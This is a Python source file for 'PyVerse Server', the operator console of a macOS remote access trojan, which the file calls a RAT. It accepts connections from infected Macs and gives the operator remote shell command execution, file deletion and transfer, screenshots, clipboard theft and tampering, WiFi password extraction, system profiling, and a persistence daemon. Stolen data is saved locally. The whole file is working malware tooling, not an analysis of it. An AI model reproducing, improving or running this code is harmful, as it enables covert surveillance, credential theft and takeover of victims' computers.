# Imports
import argparse
import base64
import getpass
import os
import socket
import string
import sys
import time

import pyperclip
from colorama import Fore
from tqdm import tqdm
from playsound import playsound
import random

global connected
user = getpass.getuser()
current_working_dir = os.getcwd()
path = current_working_dir + "/Saved Client Info/"
path1 = current_working_dir + "/Saved Client Info/Screenshots/"
version = 2.3
saved_info = []


def mkdirs():
    current_working_directory = os.getcwd()
    client_info_path = current_working_directory + "/Saved Client Info/"
    screenshot_path = current_working_directory + "/Saved Client Info/Screenshots/"
    try:
        if os.path.exists(client_info_path):
            pass
        else:
            os.mkdir(client_info_path)
            print("Success Directory: " + client_info_path + " Was Made")
        if os.path.exists(screenshot_path):
            pass
        else:
            os.mkdir(screenshot_path)
            print("Success Directory: " + screenshot_path + " Was Made")
    except Exception as Error1:
        print("[-] Creation of the directory %s failed" % Error1)
    else:
        pass


mkdirs()


def soundboard():
    conn.send(command.encode())
    volume_data = conn.recv(b_size).decode()
    print(f"""---System Sound---
Current Volume Level: {volume_data}
[?] 1: Turn Off System Sound.
[?] 2: Turn On System Sound.
[?] 3: Change System Sound Volume.
------""")
    userinput = input(f"[{Fore.LIGHTCYAN_EX}${Fore.LIGHTBLUE_EX}] <{username_data}>: ").lower()
    if userinput == "1":
        conn.send(userinput.encode())
    elif userinput == "2":
        conn.send(userinput.encode())
    elif userinput == "3":
        conn.send(userinput.encode())
        uinput2 = input(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Enter Volume: ").lower()
        if len(uinput2) > 0:
            conn.send(uinput2.encode())
            print(f"Success: Changed Volume To {uinput2}.")
        else:
            print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Please Input A Number.")
            conn.send("quit".encode())
    else:
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Please Select A Choice.")
        conn.send("quit".encode())


def screenshot():
    conn.send(command.encode())
    N = random.randint(1, 5)
    x = ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
    cwd1 = os.getcwd()
    screenshot_path = cwd1 + "/Saved Client Info/Screenshots/Screenshot" + str(x) + '.jpg'
    try:
        conn.settimeout(2.5)
        with open(screenshot_path, 'wb') as f:
            while True:
                image_data_socket = conn.recv(204080)
                imgdata = base64.b64decode(image_data_socket)
                if not imgdata:
                    break
                else:
                    f.write(imgdata)
        print("Sucessfully Saved Screenshot To: " + screenshot_path)
    except Exception as Error2:
        print(f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}] Screenshot Saving Failed Error: " + str(Error2))
        print("Checking If Directories Are Made...")
        mkdirs()


def notify(title, text):
    os.system("""
              osascript -e 'display notification "{}" with title "{}"'
              """.format(text, title))


def wifipassword():
    conn.settimeout(60)
    print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Waiting For {username_data} To Authenticate Time Till Timeout: 60s")
    conn.send(command.encode())
    name_data = conn.recv(b_size).decode()
    received_data = conn.recv(b_size).decode()
    password = received_data.replace("\\n'", '')
    password = password.replace("b'", '')
    password_Split = password.split()
    password_Split = password_Split[-1]
    print("WiFi Name:" + name_data)
    print("WiFi Password:" + password_Split)
    saved_info.extend(["WiFi Name: " + name_data + "| WiFi Password: " + password_Split])
    time.sleep(.5)
    userinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}]Would You Like To Save This Information y/n?\n").lower()
    if ("y" or 'yes') in userinput:
        cwd1 = os.getcwd()
        path_1 = cwd1 + "/Saved Client Info/WiFi Password.txt"
        file1 = open(path_1, 'w')
        file1.write("WiFi Name: " + name_data + "\n" + "WiFi Password: " + password_Split)
        print("WiFi Password And Name Saved To: " + path_1)


def dlimage():
    conn.send(command.encode())
    current_working_directory = conn.recv(b_size).decode()
    print(f"Current Working Dir: {current_working_directory}")
    url = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Enter Image URL For Download: ")
    conn.send(url.encode())
    file_name1 = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Enter File Name For New Image: ")
    file_name = file_name1 + ".jpg"
    conn.send(file_name.encode())
    file_path = conn.recv(b_size).decode()
    print("SUCCESS: Saved To " + file_path)


def logo():
    os.system('clear')
    print(Fore.CYAN + """
 ______                                      ______  
(_____ \                                    (_____ \ 
 _____) )   _ _   _ _____  ____ ___ _____     ____) )
|  ____/ | | | | | | ___ |/ ___)___) ___ |   / ____/ 
| |    | |_| |\ V /| ____| |  |___ | ____|  | (_____ 
|_|     \__  | \_/ |_____)_|  (___/|_____)  |_______)
       (____/                                                                
""")


s = socket.socket()
s_host = socket.gethostname()
s_port = 5004
b_size = 999999999

parser = argparse.ArgumentParser(description="Choose Your Host And Port")
parser.add_argument('-host', metavar='host', type=str, nargs='?', default=socket.gethostname())
parser.add_argument('-port', metavar='port', type=int, nargs='?', default=5004)
args = parser.parse_args()


def v_conn():
    print(Fore.LIGHTBLUE_EX + "[I]" + "-" * 15 + "PyVerse Server " + "-" * 15)
    print(f"""{Fore.RED}[{Fore.LIGHTYELLOW_EX}I{Fore.RED}] Server Version: {version}
[{Fore.LIGHTYELLOW_EX}I{Fore.RED}] Server Host: {s_host}.
[{Fore.LIGHTYELLOW_EX}I{Fore.RED}] Server Port: {s_port}.
[{Fore.LIGHTYELLOW_EX}I{Fore.RED}] Client Name: {username_data}.
[{Fore.LIGHTYELLOW_EX}I{Fore.RED}] Client Version: {version_data}.""")
    print(Fore.RED + f"[{Fore.LIGHTYELLOW_EX}I{Fore.RED}] Connected To {username_data}:{addr}:{s_port}")
    print(Fore.LIGHTBLUE_EX + "[I]" + "-" * 45)


logo()
# noinspection PyRedeclaration
connected = False
print(Fore.LIGHTYELLOW_EX + "-" * 15 + "PyVerse Server" + "-" * 15)
print(f"""{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}I{Fore.LIGHTBLUE_EX}] Made By: Izaan Noman
[{Fore.LIGHTYELLOW_EX}I{Fore.LIGHTBLUE_EX}] Server Version: {version}
[{Fore.LIGHTYELLOW_EX}I{Fore.LIGHTBLUE_EX}] Server Host: {s_host}
[{Fore.LIGHTYELLOW_EX}I{Fore.LIGHTBLUE_EX}] Server Port: {s_port}""")
print(f"[{Fore.LIGHTGREEN_EX}?{Fore.LIGHTBLUE_EX}] Listening For Incoming Connections...")


def serverbind():
    try:
        s.bind((s_host, s_port))
        s.listen(1)
    except Exception as ERROR:
        print(Fore.LIGHTRED_EX + f"{Fore.WHITE}[{Fore.RED}-{Fore.WHITE}] Binding Failed Error Code: " + str(ERROR) + f"\n[{Fore.RED}!{Fore.WHITE}]{Fore.RED} Retrying...")
        time.sleep(3)
        serverbind()


serverbind()
conn, addr = s.accept()
username_data = conn.recv(b_size).decode()
time.sleep(.5)
version_data = conn.recv(b_size).decode()
notify("[PyVerse Server]", f"[+] {username_data}:{addr}:{s_port} Has Joined Your Server.")
print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] {username_data}:{addr}:{s_port} Has Connected.")
if version_data < str(version):
    print(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Client Version: {version_data}\n{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] An Update Is Available See 'update' For More Information.")
elif version_data == str(version):
    print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Client Version: {version_data}.")
    print(f"{Fore.LIGHTYELLOW_EX}-" * 45)
elif str(version) < version_data:
    print(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] An Update Is Available For PyVerse Server")
else:
    print(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Client Is Running An Unknown Version.")
# noinspection PyRedeclaration
connected = True
# Commands
while connected:
    conn.settimeout(60)
    command = input(Fore.LIGHTBLUE_EX + f"[{Fore.BLUE}${Fore.LIGHTBLUE_EX}] <{Fore.RED}{username_data}{Fore.LIGHTBLUE_EX}>{Fore.WHITE} ").lower()
    if command == "quit":
        conn.send(command.encode())
        conn.close()
        s.close()
        time.sleep(.5)
        quit()
    elif command == "cwd":
        conn.send(command.encode())
        cwd = conn.recv(b_size)
        cwd = cwd.decode()
        print(cwd)
    elif command == "help":
        print(Fore.LIGHTGREEN_EX + f"""{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}]--PyVerse Help Options-- 
Key: [*] - Requires Elevation.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] cwd             - View Current Working Directory.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] quit            - Exit The Connection So You Can Connect Again.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] help            - Print Help Options.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] clear           - Clear The Terminal Screen.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] vdir            - View The Contents Of Any Directory.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] del             - Delete Any File.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] dfile           - Download Any Text Based File.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] dlimage         - Download Any Image From The Web To The Clients Mac.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] sfile           - Send Any Text Based File.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] cd              - Change Current Working Directory.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] vconn           - View Current Connection Status.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] sysinfo         - View Clients System Info.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] os              - Run Native Terminal Commands.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] cboard          - View Contents And Copy Clipboard.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] chgboard        - Change The Clients Current Clipboard.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] speechtext      - Translate The Clients Speech To Text. [*] *Experimental*
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] getwifi         - Get The Current WiFi Password. [*]
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] wifinfo         - Retrieve Clients WiFi Information.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] exit            - Exit The Program Fully On The Clients Mac.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] restart         - Restart The Connection Between You And The Client.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] processlist     - List The Open Processes.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] remove_rat      - Remove The RAT From The Clients Mac.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] screenshot      - Take A Screenshot Of The Clients Mac.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] soundboard      - Control System Sound.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] caffeinate      - Prevent Mac From Sleeping.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] uncaffeinate    - Let The Mac Sleep.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] persist         - Run Pyverse Persist Daemon. [May Make Connection Buggy]
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] unpersist       - Remove The Persist Daemon.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] copy            - Make A Copy Of The RAT To Any Directory.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] update          - Update The Clients RAT To The Latest Version.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] update_payload  - Update Persistent Payload.
{Fore.LIGHTBLUE_EX}[{Fore.LIGHTYELLOW_EX}H{Fore.LIGHTBLUE_EX}] saved_info      - View Saved Info.
----""")
    elif command == "del":
        conn.send(command.encode())
        try:
            f_path = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Enter Last Path And File Name: ")
            f_path = str(f_path)
            conn.send(f_path.encode())
            time.sleep(.5)
            if not f_path:
                conn.send(" ".encode())
                data = conn.recv(b_size).decode()
                print(data)
            else:
                data = conn.recv(b_size).decode()
                print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Successfully Deleted " + "'" + data + "'")
        except Exception as Error:
            print(str(Error))
    elif command == "vdir":
        conn.send(command.encode())
        vdir = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Enter File Path: ").lower()
        if vdir == "cwd":
            conn.send(vdir.encode())
            data = conn.recv(b_size).decode()
            data = data.replace(",", "\n")
            data = data.replace("'", "")
            print(data)
        else:
            if len(vdir) > 0:
                conn.send(vdir.encode())
                data = conn.recv(b_size)
                data = str((data.decode()))
                data = data.replace(",", "\n")
                data = data.replace("'", "")
                print(data)
            else:
                conn.send("/".encode())
                data = conn.recv(b_size)
                data = str((data.decode()))
                data = data.replace(",", "\n")
                data = data.replace("'", "")
                print(data)
    elif command == "clear":
        os.system('clear')
        logo()
        v_conn()
    elif command == "dfile":
        try:
            conn.send(command.encode())
            cwd_files = conn.recv(b_size)
            cwd_files = cwd_files.decode()
            print(cwd_files)
            file = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Enter File Path And Name: ")
            if len(file) > 0:
                conn.send(file.encode())
                data1 = conn.recv(b_size)
                data = str(data1.decode())
                print("Successfully Downloaded")
                filename = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Enter New Name For File: ")
                newfile = open(filename, 'wb')
                newfile.write(data1)
                newfile.close()
                print("File Saved To: " + str(os.getcwd()))
            else:
                print("No Such Path Exists!")
        except Exception as e:
            print("Error Downloading File: " + str(e))
    elif command == 'sfile':
        try:
            conn.send(command.encode())
            file = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Enter File Path And Name: ")
            file = "/Users/" + getpass.getuser() + "/" + file
            data = open(file, 'rb')
            file_data = data.read(b_size)
            conn.send(file_data)
            filename = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Please Enter New File Name: ")
            conn.send(filename.encode())
            print(file + " Has Been Sent!")
        except Exception as e:
            print("Not A Valid Directory!: " + str(e))
            conn.send("quit".encode())
            pass
    elif command == "os":
        conn.send(command.encode())
        cmd = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Enter Command For Execution: ")
        conn.send(cmd.encode())
        if len(cmd) > 0:
            data = conn.recv(b_size).decode()
            print(data)
        else:
            conn.send('quit'.encode())
    elif command == "cd":
        try:
            conn.send(command.encode())
            path = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Enter Full Path: ")
            conn.send(path.encode())
            data = conn.recv(b_size)
            data = data.decode()
            print(data)
        except Exception as e:
            print("[-] Error: " + str(e))
        pass
    elif command == "live":
        conn.send(command.encode())
        data = conn.recv(b_size).decode()
        print(data)
    elif command == "vconn":
        v_conn()
    elif command == "sysinfo":
        conn.send(command.encode())
        print("=" * 20 + "Data Types" + "=" * 20 + """
        Key - * = Can Take A Very Long Time
        [?] 1 - Hardware Information.
        [?] 2 - Ethernet And Printer Information.
        [?] 3 - Network Information.
        [?] 4 - Software Information.
        [?] 5 - Accessibility Information.
        [*] 6 - Applications Information.
        [?] 7 - Bluetooth Information.
        [?] 8 - Hard Drive Information.
        [?] 9 - Power Information.
        [?] 10 - Airport Information.
        [?] 11 - Mini Information Of The Clients Mac.
        [?] 12 - Basic Information Of The Clients Mac.
        [*] 13 - Everything About The Clients Mac [Can Take Very Long To Load Data] """)
        uinput = str(input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Select Data Type: "))
        if uinput == "1":
            conn.send(uinput.encode())
            loop = tqdm(total=1000, position=0, leave=False)
            for k in range(1000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Hardware Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Hardware Information To " + path)
        elif uinput == "2":
            conn.send(uinput.encode())
            loop = tqdm(total=1500, position=0, leave=False)
            for k in range(1500):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Ethernet And Printer Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Ethernet And Printer Information To " + path)
        elif uinput == "3":
            conn.send(uinput.encode())
            loop = tqdm(total=1000, position=0, leave=False)
            for k in range(1000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Network Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Network Information To " + path)
        elif uinput == "4":
            conn.send(uinput.encode())
            loop = tqdm(total=5000, position=0, leave=False)
            for k in range(5000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Software Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Software Information To " + path)
        elif uinput == "5":
            conn.send(uinput.encode())
            loop = tqdm(total=1000, position=0, leave=False)
            for k in range(1000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Accessibility Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Accessibility Information To " + path)
        elif uinput == "6":
            conn.send(uinput.encode())
            loop = tqdm(total=15000, position=0, leave=False)
            for k in range(15000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Application Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Application Information To " + path)
        elif uinput == "7":
            conn.send(uinput.encode())
            loop = tqdm(total=1000, position=0, leave=False)
            for k in range(1000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Bluetooth Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Bluetooth Information To " + path)
        elif uinput == "8":
            conn.send(uinput.encode())
            loop = tqdm(total=1000, position=0, leave=False)
            for k in range(1000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Hard Drive Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Hard Drive Information To " + path)
        elif uinput == "9":
            conn.send(uinput.encode())
            loop = tqdm(total=1000, position=0, leave=False)
            for k in range(1000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Power Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Power Information To " + path)
        elif uinput == "10":
            conn.send(uinput.encode())
            loop = tqdm(total=22000, position=0, leave=False)
            for k in range(22000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Airport Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Airport Information To " + path)
        elif uinput == "11":
            conn.send(uinput.encode())
            loop = tqdm(total=50000, position=0, leave=False)
            for k in range(50000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Mini Mac Analysis Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Saved Mini Mac Analysis Information To " + path)
        elif uinput == "12":
            conn.send(uinput.encode())
            loop = tqdm(total=80000, position=0, leave=False)
            for k in range(80000):
                loop.set_description("Receiving...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTRED_EX + str(data))
            time.sleep(.5)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Basic Mac Analysis Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Basic Mini Mac Analysis Information To " + path)
        elif uinput == "13":
            conn.send(uinput.encode())
            loop = tqdm(total=350000, position=0, leave=False)
            for k in range(350000):
                loop.set_description("Receiving Data...".format(k))
                loop.update(1)
            data = conn.recv(b_size).decode()
            loop.close()
            print(Fore.LIGHTBLUE_EX + "The Data Cannot Be Printed Due To The Size.")
            time.sleep(.5)
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
            if ("y" or "yes") in uinput:
                path = path + "Full Mac Analysis Info.txt"
                file = open(path, 'w')
                file.write(data)
                file.close()
                time.sleep(.5)
                print("Full Mini Mac Analysis Information To " + path)
        else:
            print("Please Select A Data Type.")
            conn.send("quit".encode())
            pass
    elif command == "cboard":
        conn.send(command.encode())
        data = conn.recv(b_size).decode()
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Clipboard Contents: " + data)
        saved_info.append("Clipboard Contents: " + data)
        uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Do You Want To Copy To Your Clipboard y/n?\n").lower()
        if ("y" or "yes") in uinput:
            pyperclip.copy(data)
            time.sleep(.5)
            print(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Copied!")
        else:
            pass
    elif command == "chgboard":
        conn.send(command.encode())
        data = conn.recv(b_size).decode()
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Current Clipboard Contents: " + data)
        time.sleep(.5)
        uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Enter New Clipboard Content: ")
        conn.send(uinput.encode())
        time.sleep(.5)
        print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Successfully Changed Clipboard Contents To: " + uinput)
    # elif command == "speechtext":
    #     uinput = input("Do You Want To Continue? This Requires Microphone Access. y/n?\n").lower()
    #     if ("y" or "yes") in uinput:
    #         conn.send(command.encode())
    #         print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Listening For Audio...")
    #         data = conn.recv(b_size).decode()
    #         print(f"{Fore.LIGHTBLUE_EX}[{Fore.LIGHTGREEN_EX}+{Fore.LIGHTBLUE_EX}] Client Said: " + data)
    elif command == "getwifi":
        try:
            uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}?{Fore.LIGHTBLUE_EX}] Do You Want To Continue? This Requires Elevation. y/n?\n").lower()
            if ("y" or "yes") in uinput:
                time.sleep(.5)
                wifipassword()
        except Exception as error:
            print(error)
    elif command == "wifinfo":
        conn.send(command.encode())
        data = conn.recv(b_size).decode()
        print("=" * 20 + "WiFi Info" + "=" * 20 + "\n" + data)
        print("=" * 20 + "WiFi Info" + "=" * 20)
        uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
        if ("y" or "yes") in uinput:
            path = path + "WiFi Info.txt"
            file = open(path, 'w')
            file.write(data)
            file.close()
            time.sleep(.5)
            print("Saved WiFi Information To " + path)
    elif command == "exit":
        uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Are You Sure You Want To Exit Both Client And Server Will Disconnect y/n?: \n").lower()
        if ("y" or "yes") in uinput:
            conn.send(command.encode())
            time.sleep(1)
            s.close()
            conn.close()
            quit()
        else:
            pass
    elif command == "dlimage":
        dlimage()
    elif command == "restart":
        conn.send(command.encode())
        time.sleep(.5)
        conn.close()
        s.close()
        print("Restarting...")
        time.sleep(.5)
        os.execl(sys.executable, sys.executable, *sys.argv)
    elif command == "processlist":
        conn.send(command.encode())
        data = conn.recv(b_size).decode()
        print(data)
        uinput = input(f"{Fore.LIGHTBLUE_EX}[{Fore.RED}!{Fore.LIGHTBLUE_EX}] Would You Like To Save This Information y/n?\n").lower()
        if ("y" or "yes") in uinput:
            path = path + "Processes List.txt"
            file = open(path, 'w')
            file.write(data)
            file.close()
            time.sleep(.5)
